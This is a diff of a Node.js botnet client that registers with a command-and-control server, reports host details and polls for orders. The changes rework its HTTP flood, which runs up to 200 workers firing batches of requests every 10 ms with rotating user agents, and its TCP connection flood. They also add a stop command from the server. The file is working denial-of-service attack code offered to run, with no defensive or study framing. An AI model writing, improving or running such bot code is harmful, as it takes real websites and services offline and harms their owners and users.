@@ -1,16 +1,13 @@
-// JavaScript Bot Client - PROPER THREADING & ATTACKS
-// Save as: js_bot_proper.js
-// Run: node js_bot_proper.js
+// JavaScript Bot Client - WORKING ATTACKS + SERVER STOP
+// Save as: js_bot_working.js
+// Run: node js_bot_working.js
 
 const https = require('https');
 const http = require('http');
 const net = require('net');
-const dgram = require('dgram');
 const crypto = require('crypto');
 const os = require('os');
 const url = require('url');
-const cluster = require('cluster');
-const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 
 class JSBot {
     constructor() {
@@ -18,19 +15,24 @@ class JSBot {
         this.botId = 'JS-' + crypto.randomBytes(4).toString('hex').toUpperCase();
         this.connected = false;
         this.currentAttack = null;
-        this.attackWorkers = [];
         this.activeAttack = null;
+        this.stopRequested = false;
         
         // Attack statistics
-        this.attackStats = {
+        this.stats = {
             startTime: null,
             totalRequests: 0,
             successfulRequests: 0,
             failedRequests: 0,
             bytesSent: 0,
             requestsPerSecond: 0,
-            lastUpdate: Date.now()
+            lastRpsUpdate: Date.now(),
+            lastRequestCount: 0
         };
+        
+        // Worker tracking
+        this.workers = [];
+        this.workerStats = new Map();
         
         // Bot specifications
         this.specs = {
@@ -47,7 +49,7 @@ class JSBot {
                 udp: true,
                 slowloris: true,
                 wordpress: true,
-                threads: 200 // Max threads we can handle
+                max_threads: 200
             }
         };
         
@@ -60,14 +62,13 @@ class JSBot {
         };
         
         console.log('\n' + '='.repeat(70));
-        console.log('  🚀 JAVASCRIPT BOT CLIENT - HIGH PERFORMANCE');
+        console.log('  🚀 JAVASCRIPT BOT CLIENT - WORKING ATTACKS');
         console.log('='.repeat(70));
         console.log(`🤖 Bot ID: ${this.botId}`);
         console.log(`🌐 Server: ${this.serverUrl}`);
         console.log(`💻 CPU Cores: ${this.specs.cpu_cores}`);
         console.log(`🧠 RAM: ${this.specs.ram_gb}GB`);
         console.log(`📦 OS: ${this.specs.os}`);
-        console.log(`⚡ Max Threads: ${this.specs.capabilities.threads}`);
         console.log('='.repeat(70) + '\n');
         
         // Setup console updates
@@ -75,26 +76,32 @@ class JSBot {
     }
     
     setupConsoleUpdates() {
-        // Update console every second
+        // Update console every 500ms
         setInterval(() => {
             if (this.activeAttack) {
-                const elapsed = Math.floor((Date.now() - this.attackStats.startTime) / 1000);
-                const rps = this.attackStats.requestsPerSecond;
-                const successRate = this.attackStats.totalRequests > 0 ? 
-                    Math.round((this.attackStats.successfulRequests / this.attackStats.totalRequests) * 100) : 0;
-                const mbSent = (this.attackStats.bytesSent / (1024 * 1024)).toFixed(2);
+                const elapsed = Math.floor((Date.now() - this.stats.startTime) / 1000);
+                const rps = this.stats.requestsPerSecond;
+                const total = this.stats.totalRequests;
+                const successRate = total > 0 ? 
+                    Math.round((this.stats.successfulRequests / total) * 100) : 0;
+                const mbSent = (this.stats.bytesSent / (1024 * 1024)).toFixed(2);
                 
-                process.stdout.write(`\r\x1b[K📊 ${this.activeAttack.type.toUpperCase()} ATTACK | ` +
-                                   `⏱️ ${elapsed}s | ` +
-                                   `📨 ${this.attackStats.totalRequests.toLocaleString()} req | ` +
+                // Calculate remaining time
+                const remaining = this.activeAttack.duration - elapsed;
+                const progress = Math.min(100, (elapsed / this.activeAttack.duration) * 100);
+                
+                process.stdout.write(`\r\x1b[K📊 ${this.activeAttack.type.toUpperCase()} | ` +
+                                   `⏱️ ${elapsed}s/${this.activeAttack.duration}s | ` +
+                                   `📈 ${progress.toFixed(1)}% | ` +
+                                   `📨 ${total.toLocaleString()} | ` +
                                    `⚡ ${rps.toLocaleString()}/s | ` +
                                    `✅ ${successRate}% | ` +
                                    `📦 ${mbSent} MB`);
             }
-        }, 1000);
+        }, 500);
     }
     
-    async sendRequest(endpoint, method = 'POST', data = null, timeout = 25000) {
+    async sendRequest(endpoint, method = 'POST', data = null, timeout = 20000) {
         return new Promise((resolve, reject) => {
             const urlParts = new URL(this.serverUrl);
             const options = {
@@ -105,8 +112,7 @@ class JSBot {
                 headers: {
                     'Content-Type': 'application/json',
                     'User-Agent': 'JSBot/2.0',
-                    'Connection': 'close',
-                    'Accept': '*/*'
+                    'Connection': 'close'
                 },
                 rejectUnauthorized: false,
                 timeout: timeout
@@ -128,7 +134,7 @@ class JSBot {
             });
             
             req.on('error', (err) => {
-                reject(new Error(`Network error: ${err.message}`));
+                reject(new Error(`Network: ${err.message}`));
             });
             
             req.on('timeout', () => {
@@ -159,16 +165,15 @@ class JSBot {
                 console.log('[✓] ✅ CONNECTED! Bot approved by server.');
                 console.log(`[✓] 📋 Client Type: ${response.client_type}`);
                 
-                // Initial status
                 await this.sendRequest('/status', 'POST', {
                     bot_id: this.botId,
                     status: 'connected',
-                    message: `JavaScript bot ready - ${this.specs.cpu_cores} cores, ${this.specs.ram_gb}GB RAM`
+                    message: 'JavaScript bot ready'
                 });
                 
                 return true;
             } else {
-                console.log('[X] ❌ Connection rejected:', response.error || 'Unknown');
+                console.log('[X] ❌ Connection rejected');
                 return false;
             }
         } catch (error) {
@@ -184,24 +189,22 @@ class JSBot {
             await this.sendRequest('/status', 'POST', {
                 bot_id: this.botId,
                 status: this.activeAttack ? 'attacking' : 'idle',
-                stats: {
-                    ...this.globalStats,
-                    current_rps: this.attackStats.requestsPerSecond,
-                    active_threads: this.attackWorkers.length
-                },
+                stats: this.globalStats,
+                current_rps: this.stats.requestsPerSecond,
                 attack_info: this.activeAttack ? {
                     type: this.activeAttack.type,
                     target: this.activeAttack.target,
-                    duration: this.activeAttack.duration,
-                    progress: Math.min(100, ((Date.now() - this.attackStats.startTime) / (this.activeAttack.duration * 1000)) * 100)
+                    threads: this.activeAttack.threads,
+                    progress: this.getAttackProgress(),
+                    duration: this.activeAttack.duration
                 } : null
             });
             
             if (!this.activeAttack) {
                 const uptime = Math.floor((Date.now() - this.globalStats.uptime) / 1000);
                 console.log(`\r\x1b[K[♥] 💓 Heartbeat | Uptime: ${this.formatTime(uptime)} | ` +
-                          `Total Attacks: ${this.globalStats.successful_attacks} | ` +
-                          `Total Requests: ${this.globalStats.total_requests.toLocaleString()}`);
+                          `Attacks: ${this.globalStats.successful_attacks} | ` +
+                          `Requests: ${this.globalStats.total_requests.toLocaleString()}`);
             }
         } catch (error) {
             console.log(`\n[!] 💔 Heartbeat failed: ${error.message}`);
@@ -213,6 +216,12 @@ class JSBot {
         const m = Math.floor((seconds % 3600) / 60);
         const s = seconds % 60;
         return `${h}h ${m}m ${s}s`;
+    }
+    
+    getAttackProgress() {
+        if (!this.activeAttack || !this.stats.startTime) return 0;
+        const elapsed = (Date.now() - this.stats.startTime) / 1000;
+        return Math.min(100, (elapsed / this.activeAttack.duration) * 100);
     }
     
     async checkCommands() {
@@ -228,59 +237,67 @@ class JSBot {
     async stopAttack() {
         if (!this.activeAttack) return;
         
-        console.log(`\n[!] 🛑 Stopping ${this.activeAttack.type} attack...`);
+        console.log(`\n[!] 🛑 Stopping attack: ${this.activeAttack.type}`);
         
-        // Stop all workers
-        this.attackWorkers.forEach(worker => {
-            if (worker && worker.terminate) {
-                worker.terminate();
+        // Set stop flag
+        this.stopRequested = true;
+        
+        // Clear all intervals and timeouts
+        this.workers.forEach(worker => {
+            if (worker.interval) clearInterval(worker.interval);
+            if (worker.timeout) clearTimeout(worker.timeout);
+            if (worker.socket && !worker.socket.destroyed) {
+                worker.socket.destroy();
             }
         });
         
-        this.attackWorkers = [];
-        this.activeAttack = null;
+        this.workers = [];
         
-        // Update final stats
-        const elapsed = (Date.now() - this.attackStats.startTime) / 1000;
-        const avgRps = Math.round(this.attackStats.totalRequests / elapsed);
+        // Calculate final stats
+        const elapsed = (Date.now() - this.stats.startTime) / 1000;
+        const avgRps = elapsed > 0 ? Math.round(this.stats.totalRequests / elapsed) : 0;
         
-        console.log(`[✓] 📊 Attack completed:`);
+        console.log(`[✓] 📊 Attack stopped:`);
         console.log(`    • Duration: ${elapsed.toFixed(1)}s`);
-        console.log(`    • Total Requests: ${this.attackStats.totalRequests.toLocaleString()}`);
+        console.log(`    • Total Requests: ${this.stats.totalRequests.toLocaleString()}`);
         console.log(`    • Average RPS: ${avgRps.toLocaleString()}/s`);
-        console.log(`    • Success Rate: ${Math.round((this.attackStats.successfulRequests / this.attackStats.totalRequests) * 100)}%`);
-        console.log(`    • Data Sent: ${(this.attackStats.bytesSent / (1024 * 1024)).toFixed(2)} MB`);
+        console.log(`    • Success Rate: ${this.stats.totalRequests > 0 ? 
+            Math.round((this.stats.successfulRequests / this.stats.totalRequests) * 100) : 0}%`);
+        console.log(`    • Data Sent: ${(this.stats.bytesSent / (1024 * 1024)).toFixed(2)} MB`);
         
         // Send completion status
         try {
             await this.sendRequest('/status', 'POST', {
                 bot_id: this.botId,
-                status: 'completed',
-                message: `${this.attackStats.totalRequests.toLocaleString()} requests sent at ${avgRps.toLocaleString()}/s`,
+                status: 'stopped',
+                message: `Attack stopped - ${this.stats.totalRequests.toLocaleString()} requests sent`,
                 stats: {
-                    requests: this.attackStats.totalRequests,
+                    requests: this.stats.totalRequests,
                     rps: avgRps,
                     duration: elapsed,
-                    bytes: this.attackStats.bytesSent
+                    bytes: this.stats.bytesSent
                 }
             });
         } catch (error) {
-            // Ignore status errors
+            // Ignore
         }
         
-        // Reset attack stats
-        this.attackStats = {
+        // Reset attack state
+        this.activeAttack = null;
+        this.stopRequested = false;
+        this.stats = {
             startTime: null,
             totalRequests: 0,
             successfulRequests: 0,
             failedRequests: 0,
             bytesSent: 0,
             requestsPerSecond: 0,
-            lastUpdate: Date.now()
+            lastRpsUpdate: Date.now(),
+            lastRequestCount: 0
         };
     }
     
-    // ================== HIGH-PERFORMANCE ATTACK METHODS ==================
+    // ================== WORKING HTTP FLOOD ==================
     
     async executeHTTPFlood(command) {
         console.log(`\n[⚡] 🚀 Starting HTTP ${command.method || 'GET'} flood attack`);
@@ -289,7 +306,7 @@ class JSBot {
         console.log(`    • Duration: ${command.duration || 60}s`);
         console.log(`    • Method: ${command.method || 'GET'}`);
         
-        // Parse target URL
+        // Parse URL
         let targetUrl;
         try {
             targetUrl = new URL(command.target);
@@ -297,17 +314,23 @@ class JSBot {
             targetUrl = new URL(`http://${command.target}`);
         }
         
+        const hostname = targetUrl.hostname;
+        const port = targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80);
+        const path = targetUrl.pathname + targetUrl.search;
+        const isHttps = targetUrl.protocol === 'https:';
+        
         // Setup attack
         this.activeAttack = {
             type: 'http_flood',
             target: command.target,
             duration: parseInt(command.duration) || 60,
-            threads: parseInt(command.threads) || 100,
+            threads: Math.min(parseInt(command.threads) || 100, 200),
             method: command.method || 'GET'
         };
         
-        this.attackStats.startTime = Date.now();
-        this.attackStats.lastUpdate = Date.now();
+        this.stats.startTime = Date.now();
+        this.stats.lastRpsUpdate = Date.now();
+        this.stats.lastRequestCount = 0;
         
         // Send start status
         try {
@@ -321,156 +344,168 @@ class JSBot {
             console.log(`[!] Status update failed: ${error.message}`);
         }
         
-        console.log(`[→] 🚀 Launching ${this.activeAttack.threads} attack threads...`);
+        console.log(`[→] 🚀 Launching ${this.activeAttack.threads} attack workers...`);
         
         // User agents for rotation
         const userAgents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15'
         ];
         
-        // Calculate requests per thread
-        const requestsPerThread = 1000; // Each thread will make this many requests
-        
-        // Create attack function
-        const attackFunction = async (threadId) => {
-            const startTime = Date.now();
-            const endTime = startTime + (this.activeAttack.duration * 1000);
-            let threadRequests = 0;
-            let threadSuccess = 0;
-            let threadBytes = 0;
-            
-            const options = {
-                hostname: targetUrl.hostname,
-                port: targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80),
-                path: targetUrl.pathname + targetUrl.search,
-                method: this.activeAttack.method,
-                headers: {
-                    'User-Agent': userAgents[threadId % userAgents.length],
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                    'Accept-Language': 'en-US,en;q=0.5',
-                    'Accept-Encoding': 'gzip, deflate',
-                    'Connection': 'keep-alive',
-                    'Cache-Control': 'no-cache',
-                    'Pragma': 'no-cache'
-                },
-                timeout: 5000
-            };
-            
-            // Pre-generate POST data if needed
-            const postData = this.activeAttack.method === 'POST' ? 
-                `data=${crypto.randomBytes(1000).toString('hex')}` : null;
-            
-            if (postData) {
-                options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
-                options.headers['Content-Length'] = Buffer.byteLength(postData);
-            }
-            
-            const protocol = targetUrl.protocol === 'https:' ? https : http;
-            
-            while (Date.now() < endTime && this.activeAttack && this.activeAttack.type === 'http_flood') {
-                try {
-                    const req = protocol.request(options, (res) => {
-                        threadSuccess++;
-                        threadRequests++;
-                        threadBytes += 100; // Approximate response size
-                        
-                        // Update global stats
-                        this.attackStats.totalRequests++;
-                        this.attackStats.successfulRequests++;
-                        this.attackStats.bytesSent += 1100; // Request + response
-                        
-                        res.on('data', () => {}); // Drain response
-                        res.on('end', () => {});
+        // Create a simple HTTP request function
+        const makeRequest = () => {
+            return new Promise((resolve) => {
+                const options = {
+                    hostname: hostname,
+                    port: port,
+                    path: path,
+                    method: this.activeAttack.method,
+                    headers: {
+                        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+                        'Accept': '*/*',
+                        'Connection': 'close'
+                    },
+                    timeout: 5000
+                };
+                
+                const req = (isHttps ? https : http).request(options, (res) => {
+                    // Count as success
+                    this.stats.totalRequests++;
+                    this.stats.successfulRequests++;
+                    this.stats.bytesSent += 1024; // Approximate
+                    
+                    // Drain the response
+                    res.on('data', () => {});
+                    res.on('end', () => {
+                        resolve(true);
                     });
-                    
-                    req.on('error', () => {
-                        threadRequests++;
-                        this.attackStats.totalRequests++;
-                        this.attackStats.failedRequests++;
-                    });
-                    
-                    req.on('timeout', () => {
-                        req.destroy();
-                        threadRequests++;
-                        this.attackStats.totalRequests++;
-                        this.attackStats.failedRequests++;
-                    });
-                    
-                    if (postData) {
-                        req.write(postData);
-                    }
-                    
-                    req.end();
-                    
-                    // Calculate RPS
-                    const now = Date.now();
-                    const timeDiff = now - this.attackStats.lastUpdate;
-                    if (timeDiff >= 1000) {
-                        const requestsSinceLast = this.attackStats.totalRequests - this.attackStats.requestsPerSecond;
-                        this.attackStats.requestsPerSecond = Math.round(requestsSinceLast / (timeDiff / 1000));
-                        this.attackStats.lastUpdate = now;
-                    }
-                    
-                    // Small delay to prevent event loop blocking
-                    if (threadRequests % 100 === 0) {
-                        await new Promise(resolve => setImmediate(resolve));
-                    }
-                    
-                } catch (error) {
-                    threadRequests++;
-                    this.attackStats.totalRequests++;
-                    this.attackStats.failedRequests++;
-                }
-            }
-            
-            return { threadId, requests: threadRequests, success: threadSuccess, bytes: threadBytes };
+                });
+                
+                req.on('error', () => {
+                    this.stats.totalRequests++;
+                    this.stats.failedRequests++;
+                    resolve(false);
+                });
+                
+                req.on('timeout', () => {
+                    req.destroy();
+                    this.stats.totalRequests++;
+                    this.stats.failedRequests++;
+                    resolve(false);
+                });
+                
+                req.end();
+            });
         };
         
-        // Start threads using simple async functions (not worker threads for simplicity)
-        this.attackWorkers = [];
-        
-        for (let i = 0; i < this.activeAttack.threads; i++) {
-            const workerPromise = attackFunction(i);
-            this.attackWorkers.push({
-                promise: workerPromise,
-                terminate: () => {} // Can't terminate promises, but we'll handle cleanup
-            });
+        // Create worker function that continuously makes requests
+        const createWorker = (workerId) => {
+            let workerActive = true;
+            let workerRequests = 0;
             
-            // Stagger thread start to avoid connection flooding
+            const worker = {
+                id: workerId,
+                requests: 0,
+                interval: null
+            };
+            
+            // Function to make a batch of requests
+            const makeRequestsBatch = async () => {
+                if (!workerActive || this.stopRequested) return;
+                
+                try {
+                    // Make 10 requests in parallel
+                    const batchPromises = [];
+                    for (let i = 0; i < 10; i++) {
+                        batchPromises.push(makeRequest());
+                    }
+                    
+                    await Promise.allSettled(batchPromises);
+                    workerRequests += 10;
+                    
+                } catch (error) {
+                    // Ignore batch errors
+                }
+            };
+            
+            // Start making requests
+            worker.interval = setInterval(() => {
+                if (workerActive && !this.stopRequested) {
+                    makeRequestsBatch();
+                } else {
+                    clearInterval(worker.interval);
+                }
+            }, 10); // Make batch every 10ms = ~1000 requests/sec per worker
+            
+            this.workers.push(worker);
+            return worker;
+        };
+        
+        // Start all workers
+        for (let i = 0; i < this.activeAttack.threads; i++) {
+            createWorker(i);
+            
+            // Stagger startup
             if (i % 10 === 0) {
                 await new Promise(resolve => setTimeout(resolve, 10));
             }
         }
         
-        console.log(`[✓] ✅ All ${this.activeAttack.threads} threads started`);
+        console.log(`[✓] ✅ All ${this.activeAttack.threads} workers started`);
         console.log(`[→] ⚡ Attack running for ${this.activeAttack.duration} seconds...\n`);
         
-        // Set attack timeout
-        setTimeout(async () => {
+        // RPS calculation interval
+        const rpsInterval = setInterval(() => {
+            const now = Date.now();
+            const timeDiff = now - this.stats.lastRpsUpdate;
+            
+            if (timeDiff >= 1000) {
+                const requestsSinceLast = this.stats.totalRequests - this.stats.lastRequestCount;
+                this.stats.requestsPerSecond = Math.round(requestsSinceLast / (timeDiff / 1000));
+                this.stats.lastRpsUpdate = now;
+                this.stats.lastRequestCount = this.stats.totalRequests;
+            }
+        }, 100);
+        
+        this.workers.push({ interval: rpsInterval });
+        
+        // Stop after duration
+        const attackTimeout = setTimeout(async () => {
+            clearInterval(rpsInterval);
             await this.stopAttack();
             this.globalStats.successful_attacks++;
             this.globalStats.total_attacks++;
+            this.globalStats.total_requests += this.stats.totalRequests;
+            this.globalStats.bytes_sent += this.stats.bytesSent;
         }, this.activeAttack.duration * 1000);
+        
+        this.workers.push({ timeout: attackTimeout });
     }
     
     // ================== COMMAND EXECUTION ==================
     
     async executeCommand(command) {
-        console.log(`\n[→] 📨 Received command: ${command.type.toUpperCase()}`);
+        console.log(`\n[→] 📨 Executing: ${command.type.toUpperCase()}`);
+        
+        // Handle stop_all command immediately
+        if (command.type === 'stop_all') {
+            console.log('[→] 🛑 Received STOP command from server');
+            await this.stopAttack();
+            console.log('[✓] ✅ All attacks stopped');
+            return;
+        }
         
         // Update status
         try {
             await this.sendRequest('/status', 'POST', {
                 bot_id: this.botId,
                 status: 'processing',
-                message: `Processing ${command.type} command`
+                message: `Processing ${command.type}`
             });
         } catch (error) {
-            // Continue even if status fails
+            // Continue anyway
         }
         
         try {
@@ -484,7 +519,7 @@ class JSBot {
                     break;
                     
                 case 'stop_all':
-                    await this.stopAttack();
+                    // Already handled above
                     break;
                     
                 case 'http_flood':
@@ -492,31 +527,27 @@ class JSBot {
                     break;
                     
                 case 'tcp_flood':
-                    console.log('[→] 🔌 TCP flood (simplified version)');
-                    // Simplified TCP flood implementation
+                    console.log('[→] 🔌 TCP flood command received');
                     await this.executeSimplifiedTCPFlood(command);
                     break;
                     
                 case 'udp_flood':
-                    console.log('[→] 📦 UDP flood not fully implemented');
-                    break;
-                    
-                case 'slowloris':
-                    console.log('[→] 🐌 Slowloris not fully implemented');
-                    break;
-                    
-                case 'wordpress_xmlrpc':
-                    console.log('[→] 🏢 WordPress attack not fully implemented');
+                    console.log('[→] 📦 UDP flood command received');
+                    await this.sendRequest('/status', 'POST', {
+                        bot_id: this.botId,
+                        status: 'error',
+                        message: 'UDP flood not implemented'
+                    });
                     break;
                     
                 default:
-                    console.log(`[!] ❌ Unknown command type: ${command.type}`);
+                    console.log(`[!] ❌ Unknown command: ${command.type}`);
             }
             
-            console.log(`[✓] ✅ Command ${command.type} executed`);
+            console.log(`[✓] ✅ Command ${command.type} completed`);
             
         } catch (error) {
-            console.log(`[X] ❌ Error executing ${command.type}: ${error.message}`);
+            console.log(`[X] ❌ Command error: ${error.message}`);
             
             try {
                 await this.sendRequest('/status', 'POST', {
@@ -531,30 +562,27 @@ class JSBot {
     }
     
     async executePing() {
-        console.log('[→] 🏓 Sending ping response');
+        console.log('[→] 🏓 Sending ping');
         await this.sendRequest('/status', 'POST', {
             bot_id: this.botId,
             status: 'ping',
-            message: 'Pong! JavaScript bot is alive and ready'
+            message: 'Pong! Bot is online'
         });
     }
     
     async executeSysInfo() {
-        console.log('[→] 💻 Gathering system information');
+        console.log('[→] 💻 Gathering system info');
         
         const sysInfo = {
             uptime: os.uptime(),
-            loadavg: os.loadavg().map(n => n.toFixed(2)),
-            freemem_mb: Math.round(os.freemem() / (1024 * 1024)),
-            totalmem_mb: Math.round(os.totalmem() / (1024 * 1024)),
+            loadavg: os.loadavg(),
+            freemem: Math.round(os.freemem() / (1024 * 1024)),
+            totalmem: Math.round(os.totalmem() / (1024 * 1024)),
             cpus: os.cpus().length,
             platform: os.platform(),
-            arch: os.arch(),
-            network_interfaces: Object.keys(os.networkInterfaces()).length,
-            user: os.userInfo().username,
-            time: new Date().toISOString(),
-            node_version: process.version,
-            bot_stats: this.globalStats
+            bot_stats: this.globalStats,
+            current_attack: this.activeAttack,
+            workers: this.workers.length
         };
         
         await this.sendRequest('/status', 'POST', {
@@ -565,103 +593,114 @@ class JSBot {
     }
     
     async executeSimplifiedTCPFlood(command) {
-        console.log(`[→] 🔌 Starting TCP flood to ${command.target}`);
+        console.log(`\n[⚡] 🔌 Starting TCP flood`);
+        console.log(`    • Target: ${command.target}`);
+        console.log(`    • Threads: ${command.threads || 75}`);
+        console.log(`    • Duration: ${command.duration || 60}s`);
         
         const [host, portStr] = command.target.split(':');
         const port = parseInt(portStr) || 80;
-        const threads = parseInt(command.threads) || 75;
-        const duration = parseInt(command.duration) || 60;
         
         this.activeAttack = {
             type: 'tcp_flood',
             target: command.target,
-            duration: duration,
-            threads: threads
+            duration: parseInt(command.duration) || 60,
+            threads: parseInt(command.threads) || 75
         };
         
-        this.attackStats.startTime = Date.now();
+        this.stats.startTime = Date.now();
         
-        console.log(`[→] 🔌 Starting ${threads} TCP connections...`);
+        console.log(`[→] 🔌 Starting ${this.activeAttack.threads} connections...`);
         
-        // Simple TCP flood without proper threading for now
-        const attackInterval = setInterval(() => {
-            const socket = new net.Socket();
+        // Simple TCP worker
+        const createTCPWorker = () => {
+            const worker = { socket: null };
             
-            socket.connect(port, host, () => {
-                this.attackStats.totalRequests++;
-                this.attackStats.successfulRequests++;
+            const connectAndSend = () => {
+                if (this.stopRequested) return;
                 
-                // Send some data
-                const data = crypto.randomBytes(1024);
-                socket.write(data);
-                this.attackStats.bytesSent += data.length;
+                const socket = new net.Socket();
+                worker.socket = socket;
                 
-                // Keep connection open
-                setTimeout(() => {
+                socket.connect(port, host, () => {
+                    this.stats.totalRequests++;
+                    this.stats.successfulRequests++;
+                    
+                    // Send random data
+                    const data = crypto.randomBytes(1024);
+                    socket.write(data);
+                    this.stats.bytesSent += data.length;
+                    
+                    // Keep connection open for a bit
+                    setTimeout(() => {
+                        if (!socket.destroyed) {
+                            socket.destroy();
+                        }
+                    }, 5000);
+                });
+                
+                socket.on('error', () => {
+                    this.stats.totalRequests++;
+                    this.stats.failedRequests++;
+                });
+                
+                socket.setTimeout(3000, () => {
                     socket.destroy();
-                }, 10000);
-            });
+                });
+            };
             
-            socket.on('error', () => {
-                this.attackStats.totalRequests++;
-                this.attackStats.failedRequests++;
-            });
-            
-            socket.setTimeout(5000, () => {
-                socket.destroy();
-            });
-        }, 10); // 100 connections per second
+            // Connect every 100ms
+            worker.interval = setInterval(connectAndSend, 100);
+            this.workers.push(worker);
+        };
         
-        this.attackWorkers.push({
-            destroy: () => clearInterval(attackInterval)
-        });
+        // Start workers
+        for (let i = 0; i < this.activeAttack.threads; i++) {
+            createTCPWorker();
+        }
+        
+        console.log(`[✓] ✅ TCP flood started`);
         
         // Stop after duration
-        setTimeout(async () => {
-            clearInterval(attackInterval);
+        const timeout = setTimeout(async () => {
             await this.stopAttack();
             this.globalStats.successful_attacks++;
             this.globalStats.total_attacks++;
-        }, duration * 1000);
+        }, this.activeAttack.duration * 1000);
+        
+        this.workers.push({ timeout });
     }
     
     // ================== MAIN LOOP ==================
     
     async run() {
-        // Initial connection
+        // Connect
         if (!await this.connect()) {
-            console.log('[!] 🔌 Connection failed. Retrying in 10 seconds...');
-            setTimeout(() => this.run(), 10000);
-            return;
+            console.log('[!] 🔌 Connection failed. Exiting.');
+            process.exit(1);
         }
         
-        // Start heartbeat every 15 seconds
-        setInterval(() => this.heartbeat(), 15000);
+        // Start heartbeat every 20 seconds
+        setInterval(() => this.heartbeat(), 20000);
         
-        console.log('[+] 👂 Listening for commands...\n');
+        console.log('[+] 👂 Listening for commands (including STOP from server)...\n');
         
-        // Main command loop
+        // Main loop
         while (true) {
             try {
                 const commands = await this.checkCommands();
                 
                 if (commands.length > 0) {
-                    console.log(`\n[+] 📥 Received ${commands.length} command(s)`);
+                    console.log(`\n[+] 📥 Received ${commands.length} command(s) from server`);
                     
-                    // Execute all commands concurrently
-                    const executionPromises = commands.map(cmd => 
-                        this.executeCommand(cmd).catch(err => {
-                            console.log(`[!] ⚠️ Command execution error: ${err.message}`);
-                        })
-                    );
-                    
-                    // Wait a bit for commands to start
-                    await Promise.allSettled(executionPromises);
+                    // Process each command
+                    for (const cmd of commands) {
+                        await this.executeCommand(cmd);
+                    }
                 }
                 
-                // Check more frequently when idle, less when attacking
-                const delay = this.activeAttack ? 10000 : 5000;
-                await new Promise(resolve => setTimeout(resolve, delay));
+                // Check every 3 seconds
+                await new Promise(resolve => setTimeout(resolve, 3000));
                 
             } catch (error) {
                 console.log(`\n[!] 🔄 Main loop error: ${error.message}`);
@@ -676,27 +715,14 @@ class JSBot {
 
 const bot = new JSBot();
 
-// Handle graceful shutdown
+// Handle shutdown
 process.on('SIGINT', async () => {
-    console.log('\n\n[!] 🛑 Shutting down gracefully...');
+    console.log('\n\n[!] 🛑 Shutting down...');
     await bot.stopAttack();
-    console.log('[✓] ✅ Bot shutdown complete');
+    console.log('[✓] ✅ Bot stopped');
     process.exit(0);
 });
 
-process.on('uncaughtException', (error) => {
-    console.log(`\n[!] ⚠️ Uncaught exception: ${error.message}`);
-    console.log('[→] 🔄 Restarting bot in 5 seconds...');
-    setTimeout(() => {
-        process.exit(1);
-    }, 5000);
-});
-
-process.on('unhandledRejection', (reason, promise) => {
-    console.log(`\n[!] ⚠️ Unhandled rejection at:`, promise, 'reason:', reason);
-});
-
-// Start the bot
 bot.run().catch(error => {
     console.error('[!] 💥 Fatal error:', error);
     process.exit(1);
